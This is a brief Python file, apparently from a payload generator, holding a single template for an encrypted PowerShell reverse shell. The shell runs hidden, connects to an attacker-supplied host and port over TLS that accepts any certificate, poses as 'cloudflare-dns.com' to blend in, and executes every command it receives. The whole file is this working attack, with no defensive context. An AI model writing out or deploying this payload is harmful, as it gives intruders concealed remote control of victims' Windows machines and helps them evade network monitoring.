class Payload:
    template = "Start-Process $PSHOME\powershell.exe -ArgumentList {$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT); $stream = $client.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream, $false, ({param($sender, $certificate, $chain, $sslPolicyErrors) return $true})); $sslStream.AuthenticateAsClient('cloudflare-dns.com', $null, $sslProtocols, $false); if(!$sslStream.IsEncrypted -or !$sslStream.IsSigned) {$sslStream.Close();exit}; [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = try { iex $data 2>&1 | Out-String } catch { $_.Exception.Message }; $sendback2 = $sendback + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length); $sslStream.Flush() }; $client.Close()} -WindowStyle Hidden"